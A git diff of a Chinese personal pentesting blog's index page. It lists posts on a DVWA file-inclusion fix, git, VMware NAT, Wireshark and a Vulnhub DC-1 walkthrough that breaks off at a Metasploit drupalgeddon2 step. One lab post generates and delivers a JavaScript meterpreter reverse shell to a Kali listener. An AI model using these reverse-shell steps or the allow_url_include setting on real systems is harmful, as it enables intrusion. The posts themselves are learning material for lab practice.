@@ -1,170 +1,1094 @@
 <!DOCTYPE html>
 <html>
-  <!-- Html Head Tag-->
-  <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content>
-  <meta name="author" content="ST0new">
-  <!-- Open Graph Data -->
-  <meta property="og:title" content="ST0new的小站">
-  <meta property="og:description" content="一个ctfer，web渗透测试小白">
-  <meta property="og:site_name" content="ST0new的小站">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="http://yoursite.com">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
   
-    <link rel="alternate" href="/atom.xml" title="ST0new的小站" type="application/atom+xml">
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
   
-
-  <!-- Site Title -->
-  <title>ST0new的小站</title>
-
-  <!-- Bootstrap CSS -->
-  <link rel="stylesheet" href="/css/bootstrap.min.css">
-  <!-- Custom CSS -->
   
-  <link rel="stylesheet" href="/css/style.light.css">
-
-  <!-- Google Analytics -->
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
-
+  <link rel="stylesheet" href="/css/style.css">
 </head>
-
-  <body>
-    <!-- Page Header -->
-
-
-<header class="site-header header-background" style="background-image: url(/img/default-banner-dark.jpg)">
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <div class="page-title with-background-image">
-          <p class="title">ST0new的小站</p>
-          <p class="subtitle">博观而约取，厚积而薄发</p>
-        </div>
-        <div class="site-menu with-background-image">
-          <ul>
-            
-              <li>
-                <a href="/">
-                  
-                  Home
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="/archives">
-                  
-                  Archives
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="https://github.com/<your-github-username>">
-                  
-                  Github
-                  
-                </a>
-              </li>
-            
-              <li>
-                <a href="mailto:<your-email-address>">
-                  
-                  Email
-                  
-                </a>
-              </li>
-            
-          </ul>
-        </div>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
       </div>
     </div>
   </div>
 </header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-远程文件包含错误解决方法" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/远程文件包含错误解决方法/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.052Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/靶机/">靶机</a>
+  </div>
 
-<!-- Home Page Post List -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-10 col-md-10 col-md-offset-1">
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/远程文件包含错误解决方法/">错误提示【URL file-access is disabled in the server configuration in】解决</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-        <div class="post-item-wrapper">
-  <a href="/2019/10/03/hello-world/" class="post-title">
-      Hello World
-  </a>
-  <div class="post-excerpt">
-    <!-- Post Date and Categories -->
-    <div class="date-and-category">
-      <div class="date">2019-10-03</div>
-      <div class="categories">
-        
-          Uncategorized
-        
-      </div>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天在做dvwa的file inclusion，发现远程 文件包含出错</p>
+<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>可以看到提示的服务器配置中禁用url文件访问。<br><code>Warning: include() [function.include]: URL file-access is disabled in the server configuration in /var/www/dvwa/vulnerabilities/fi/index.php on line 35</code><br><img src="https://img-blog.csdnimg.cn/20190520194643142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<ol>
+<li><p>在linux中搜索php.ini文件  </p>
+<p> 命令：<code>find / -name php.ini</code><br><img src="https://img-blog.csdnimg.cn/20190520195041822.png" alt="在这里插入图片描述">我们去修改<code>/etc/php5/cgi/php,ini</code></p>
+</li>
+<li><p>vim 打开文件 <code>vim /etc/php5/cgi/php.ini</code><br><img src="https://img-blog.csdnimg.cn/20190520195551210.png" alt="在这里插入图片描述"></p>
+</li>
+<li><p>搜索关键字<code>allow_url_include或者allow_url_ fopen</code>设置两个都为<code>On</code><br> 可以发现<code>allow_url_include为off</code> 我们修改它为<code>On</code><br><img src="https://img-blog.csdnimg.cn/20190520195846677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+<li><p>重新尝试远程访问，访问成功。<br><img src="https://img-blog.csdnimg.cn/2019052020005065.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+</li>
+</ol>
+<hr>
+<h2 id="自己遇到的坑"><a href="#自己遇到的坑" class="headerlink" title="自己遇到的坑"></a>自己遇到的坑</h2><blockquote>
+<p>当我发现问题的时候，我没有意识的修改的是php的php.ini，而是去查看了我的dvwa的php.ini 发现没有错误，自己研究了半天，才发现想错了，可以查看自己的dvwa下大的php发现是对的。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20190520200259826.png" alt="在这里插入图片描述"></p>
+
+      
     </div>
-    <!-- Post Excerpt -->
-    <div class="excerpt typo">No Post Excerpt</div>
-    <!-- Post Tags -->
-    <div class="tags">
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/远程文件包含错误解决方法/" data-id="ck1avz65w000wacv41wu2apq0" class="article-share-link">Share</a>
       
-        <div class="untagged">Untagged</div>
       
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/远程文件包含/">远程文件包含</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/错误解决方案/">错误解决方案</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-删除github的某个文件" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/删除github的某个文件/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.051Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/实用技术/">实用技术</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/删除github的某个文件/">删除github的某个文件</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>今天用github做图床，上传的文件没有改名字并且都在同一个文件中散乱，然后想要删除的时候发现没有删除的选项。</p>
+<p>然后百度了下相关的内容，并把操作记录以备查看，并给和我一样不会的小伙伴们一个参考</p>
+</blockquote>
+<h2 id="开始前的准备"><a href="#开始前的准备" class="headerlink" title="开始前的准备"></a>开始前的准备</h2><p>首先看看我现在的情况</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9B%B4%E6%94%B9%E5%89%8D%E7%9A%84%E6%83%85%E5%86%B5.png" alt></p>
+<p>之后我们需要有git这个软件支持，我这里用的是<code>Git-2.21.0-64-bit.exe</code>这个版本</p>
+<p>附上下载地址：<a href="https://git-scm.com/download/" target="_blank" rel="noopener">git官方下载地址</a></p>
+<p>git的安装比较简单，如果需要过程请参考网上的教程，这里就不多说了</p>
+<p>下载好之后，鼠标右键就可以打开<code>git bash here</code></p>
+<h2 id="删除不需要的文件"><a href="#删除不需要的文件" class="headerlink" title="删除不需要的文件"></a>删除不需要的文件</h2><p>1 如果是刚下载git的请跟着下面的步骤走，</p>
+<p>首先先配置自己的git信息，</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%88%9A%E4%B8%8B%E8%BD%BDgit%E7%9A%84%E5%88%9D%E5%A7%8B%E6%AD%A5%E9%AA%A4.png" alt></p>
+<p>之后初始化，在设置自己的</p>
+<p>2 首先需要把github的项目拉倒本地，如果刚下载git请移步第一步</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">​</span><br><span class="line">1 添加origin  </span><br><span class="line">如果有.git 就不需要 git init  </span><br><span class="line">$ git init  </span><br><span class="line">$ git remote add origin git@github.com:ST0new/picture.git  </span><br><span class="line">2 拉取github文件  </span><br><span class="line">$ git pull origin master   </span><br><span class="line">3 查看文件  </span><br><span class="line">$ dir  </span><br><span class="line">4 删除不需要的文件  </span><br><span class="line">$ git rm -r --cached 0n7nye49.bmp  </span><br><span class="line">5 添加说明  </span><br><span class="line">$ git commit -m '删除了 0n7nye49.bmp '  </span><br><span class="line">6 更新github仓库  </span><br><span class="line">$ git add .  </span><br><span class="line">$ git push -u origin master  </span><br><span class="line">​</span><br></pre></td></tr></table></figure>
+
+<p>拉取github上的文件</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/github%E6%8B%89%E5%8F%96%E6%96%87%E4%BB%B6.png" alt></p>
+<p>输入dir查看目录</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%8B%89%E5%8F%96%E4%B8%8B%E6%9D%A5%E6%9F%A5%E7%9C%8B.png" alt></p>
+<p>选择不需要的文件删除</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/dir%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95.png" alt></p>
+<p>提交添加声明</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%8F%90%E4%BA%A4%E6%B7%BB%E5%8A%A0%E5%A3%B0%E6%98%8E.png" alt></p>
+<p>更新远程仓库</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9B%B4%E6%96%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93.png" alt></p>
+<p>查看</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%9F%A5%E7%9C%8B%E6%9B%B4%E6%96%B0%E5%90%8E%E7%9A%84%E5%86%85%E5%AE%B9.png" alt></p>
+<h3 id="报错1-没有初始化"><a href="#报错1-没有初始化" class="headerlink" title="报错1 没有初始化"></a>报错1 没有初始化</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br><span class="line">fatal: not a git repository (or any of the parent directories): .git</span><br></pre></td></tr></table></figure>
+
+<p>解决：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%B2%A1%E6%9C%89%E5%88%9D%E5%A7%8B%E5%8C%96.png" alt></p>
+<h3 id="报错2-添加远程库失败"><a href="#报错2-添加远程库失败" class="headerlink" title="报错2 添加远程库失败"></a>报错2 添加远程库失败</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add origin git@github:ST0new/picture</span><br><span class="line">fatal: remote origin already exists.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190710083208278.png" alt="在这里插入图片描述"></p>
+<p>解决：删除重新添加</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote rm origin</span><br><span class="line">$ git remote add origin git@github.com:ST0new/picture.git</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>希望能解决你的问题</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/删除github的某个文件/" data-id="ck1avz65t000qacv4nkarkjm4" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/文件删除/">文件删除</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-配置nat实现网络互通" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/配置nat实现网络互通/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.050Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/实用技术/">实用技术</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/配置nat实现网络互通/">配置NAT实现网络互通</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参加了拼客学院的第十期五天速成白帽子培训课，然后把一些常见的知识分享给大家</p>
+<h2 id="安装靶机"><a href="#安装靶机" class="headerlink" title="安装靶机"></a>安装靶机</h2><p>下载的话网上都有直接去下就好了。</p>
+<p>安装比较简单，这里推荐安装过程</p>
+<p><a href="https://jingyan.baidu.com/article/b24f6c821cb98d86bfe5da83.html" target="_blank" rel="noopener">Winxp安装教程</a></p>
+<p><a href="https://jingyan.baidu.com/article/9989c746d4f914f648ecfe2f.html" target="_blank" rel="noopener">Win2003安装教程</a></p>
+<h1 id="配置NAT-实现互通"><a href="#配置NAT-实现互通" class="headerlink" title="配置NAT 实现互通"></a>配置NAT 实现互通</h1><p>配置nat过程都一样，所以这里只演示一种方式<br>以<code>winxp</code>为例  </p>
+<ul>
+<li><p>打开虚拟机，选择以vmmware形式打开<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20190710230814.png" alt></p>
+</li>
+<li><p>配置网卡为NAT模式<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231547.png" alt></p>
+</li>
+<li><p>打开cmd 输入ipconfig 即可查看配置<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231222.png" alt><br>3 ping win2003主机，查看是否连通</p>
+</li>
+<li><p>ping 网络中的某个网站，测试是否连通<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710231326.png" alt></p>
+</li>
+</ul>
+<h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><p>如果你得vmnet8 没有配置正确是不能访问网络的<br>附上我的配置，如果有错误可以照着我的改</p>
+<ul>
+<li>虚拟网络适配器<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232159.png" alt></li>
+<li>NAT 配置<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232249.png" alt></li>
+<li>网络适配器的配置<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/9/20190710232403.png" alt></li>
+</ul>
+<hr>
+<p>希望能给刚入门的小伙伴一点启发</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/配置nat实现网络互通/" data-id="ck1avz65y000zacv481wv8o8j" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vmware/">vmware</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-利用js文件反弹shell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/利用js文件反弹shell/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.048Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/shell/">shell</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/利用js文件反弹shell/">利用js文件反弹shell</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章是按照大佬的文章复现<br>本文只用于测试，请不要将其用于非法途径<br>公众号： 洛米唯熊</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
+<li>攻击： kali<pre><code>ip: 192.168.248.132</code></pre></li>
+<li>测试： windows 7 x64<pre><code>ip: 192.168.248.136</code></pre><h1 id="工具地址"><a href="#工具地址" class="headerlink" title="工具地址"></a>工具地址</h1><a href="https://github.com/CroweCybersecurity/ps1encode" target="_blank" rel="noopener">https://github.com/CroweCybersecurity/ps1encode</a><h1 id="克隆"><a href="#克隆" class="headerlink" title="克隆"></a>克隆</h1>在kali克隆工具<br>命令：<code>git clone https://github.com/CroweCybersecurity/ps1encode.git</code></li>
+</ul>
+<h1 id="生成js脚本"><a href="#生成js脚本" class="headerlink" title="生成js脚本"></a>生成js脚本</h1><p>命令：<code>./pslencode.rb --LHOST 192.168.248.132 --LPORT 4444 --PAYLOAD windows/meterpreter/reverse_tcp --ENCODE cmd -t js</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90js%E8%84%9A%E6%9C%AC2.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%94%9F%E6%88%90.png" alt></p>
+<blockquote>
+<p> 复制文本放到文件中生成1.js文件</p>
+</blockquote>
+<h1 id="监听端口反弹shell"><a href="#监听端口反弹shell" class="headerlink" title="监听端口反弹shell"></a>监听端口反弹shell</h1><p><img src="https://img-blog.csdnimg.cn/20190707191042260.png" alt="在这里插入图片描述"></p>
+<h1 id="windows执行文件"><a href="#windows执行文件" class="headerlink" title="windows执行文件"></a>windows执行文件</h1><p>直接执行的话可能比较明显，所以参照文章我们写了一个1.html文件<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/windows%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png" alt><br>执行1.html文件，选择运行-&gt;允许阻止内容-&gt;选择是，就反弹成功了<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E6%89%A7%E8%A1%8C.png" alt><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E5%85%81%E8%AE%B8%E8%84%9A%E6%9C%AC.png" alt></p>
+<h1 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h1><h2 id><a href="#" class="headerlink" title></a><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/%E7%9B%91%E5%90%AC%E6%8E%A5%E5%8F%A3%E5%8F%8D%E5%BC%B9shell2.png" alt></h2><p>复现完成，过程简单，值得一学</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/利用js文件反弹shell/" data-id="ck1avz65v000sacv4wpiicqad" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/js反弹shell/">js反弹shell</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-解决wireshark没有捕获端口的问题" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/解决wireshark没有捕获端口的问题/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.047Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/实用技术/">实用技术</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/解决wireshark没有捕获端口的问题/">解决wireshark没有捕获端口的问题</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>今天打开wireshark发现没有捕获的接口，然后查了下需要开启npf<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125750.png" alt></p>
+<p>1 以管理员模式启动cmd<br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125903.png" alt></p>
+<p>2 输入命令 <code>net start npf</code><br><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712125750.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712130050.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/12/20190712130142.png" alt></p>
+<hr>
+<p>希望可以帮助到各位小伙伴</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/解决wireshark没有捕获端口的问题/" data-id="ck1avz65z0012acv45g4yoaj4" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wireshark/">wireshark</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Vulnhub之DC-1[find提权]" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/Vulnhub之DC-1[find提权]/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.046Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/靶机/">靶机</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/Vulnhub之DC-1[find提权]/">Vulnhub之DC-1 find 提权骚思路</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Vulnhub简介"><a href="#Vulnhub简介" class="headerlink" title="Vulnhub简介"></a>Vulnhub简介</h1><p>Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，大多是Boot2root，从启动虚机到获取操作系统的root权限和查看flag。<br>网址：<a href="https://www.vulnhub.com" target="_blank" rel="noopener">https://www.vulnhub.com</a></p>
+<h2 id="DC-系列"><a href="#DC-系列" class="headerlink" title="DC 系列"></a>DC 系列</h2><p>DC总共有6个靶机，本次我们使用的靶机是DC-1 ，难度不大，适合新手去实验和入门，<br>下载地址:  <a href="http://www.five86.com/dc-1.html" target="_blank" rel="noopener">http://www.five86.com/dc-1.html</a></p>
+<h2 id="DC-1-介绍"><a href="#DC-1-介绍" class="headerlink" title="DC-1 介绍"></a>DC-1 介绍</h2><p>DC-1 没有烧脑的难度，重点是需要我们去掌握一些常用的渗透工具，比如nmap，hydra，msf等等。<br>作者说flag在root目录下，那么我们最终的任务就是去提权或者获取到有root权限去执行命令。<br>初次接触可能需要去百度相关的知识，所以努力的你肯定会有所进步，</p>
+<h1 id="简要说明一下安装"><a href="#简要说明一下安装" class="headerlink" title="简要说明一下安装"></a>简要说明一下安装</h1><ol>
+<li>下载好之后解压，然后使用vmware打开ova文件。<br><img src="https://img-blog.csdnimg.cn/20190523224514645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">2. 之后可能会提示报错，不用管忽略。由于是桥接网络，所以我们需要设置一下，我选择的是NAT<br><img src="https://img-blog.csdnimg.cn/20190523224758585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">准备就绪，可以开始了！！</li>
+</ol>
+<h1 id="开始拿flag喽，激动不"><a href="#开始拿flag喽，激动不" class="headerlink" title="开始拿flag喽，激动不"></a>开始拿flag喽，激动不</h1><h2 id="介绍下环境"><a href="#介绍下环境" class="headerlink" title="介绍下环境"></a>介绍下环境</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">网段：192.168.248.0/24</span><br><span class="line">主机：192.168.248.149</span><br><span class="line">靶机：192.168.248.152</span><br></pre></td></tr></table></figure>
+
+<p>这里大家需要注意一下，因为我是用的ubuntu，所以有的命令需要加sudo，如果大家用的是kali就不需要了</p>
+<h2 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h2><p>命令：<code>nmap -sn 192.168.248.0/24</code></p>
+<p><img src="https://img-blog.csdnimg.cn/20190523225316403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="扫描主机"><a href="#扫描主机" class="headerlink" title="扫描主机"></a>扫描主机</h2><p>命令：<code>nmap -sS 192.168.248.152</code></p>
+<p>-sS ：半开放扫描（非3次握手的tcp扫描）比较安全，不会产生会话，几乎不会产生日志，工作中常用，建议大家不要直接全上的去扫，稳妥更稳妥，需要有root权限<br><img src="https://img-blog.csdnimg.cn/20190523225645455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="收集信息，查看目标主页"><a href="#收集信息，查看目标主页" class="headerlink" title="收集信息，查看目标主页"></a>收集信息，查看目标主页</h2><p>我这里尝试了弱密码，好像没啥用，看到了网站的管理系统，尝试查找相关漏洞攻击<br><img src="https://img-blog.csdnimg.cn/20190523225754230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="使用Metasploit查找漏洞获取shell"><a href="#使用Metasploit查找漏洞获取shell" class="headerlink" title="使用Metasploit查找漏洞获取shell"></a>使用Metasploit查找漏洞获取shell</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wxy@wxy-virtual-machine:~$ msfconsole -q</span><br><span class="line">msf5 &gt; search drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20190523225943748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhbmdfNjI0,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">选择最新最有效的的去尝试</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br></pre></td></tr></table></figure>
+
